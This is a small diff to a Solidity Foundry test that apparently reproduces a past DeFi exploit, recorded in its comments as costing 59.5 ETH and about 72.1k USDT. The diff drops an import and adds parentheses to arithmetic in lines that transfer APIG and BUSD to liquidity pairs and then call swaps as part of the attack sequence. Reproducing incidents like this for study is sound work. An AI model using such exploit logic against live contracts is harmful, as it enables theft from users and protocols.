@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : 59.5 ETH and ~72.1k USDT (~$169k)
 // Attacker : https://bscscan.com/address/0x73d80500b30a6ca840bfab0234409d98cf588089
@@ -98,9 +97,9 @@ contract ContractTest is Test {
             }
         }
 
-        APIG.transfer(address(EfBfPair), APIG_BUSD[0] + APIG_BUSD[0] / 100 * 4);
+        APIG.transfer(address(EfBfPair), APIG_BUSD[0] + (APIG_BUSD[0] / 100) * 4);
         EfBfPair.swap(amount72628, 0, address(this), "");
-        BUSD.transfer(address(aDaDPair), amount + amount / 100 * 3);
+        BUSD.transfer(address(aDaDPair), amount + (amount / 100) * 3);
         APIG.transfer(address(b920Pair), APIG.balanceOf(address(this)));
         b920Pair.swap(amount59500, 0, address(this), "");
     }
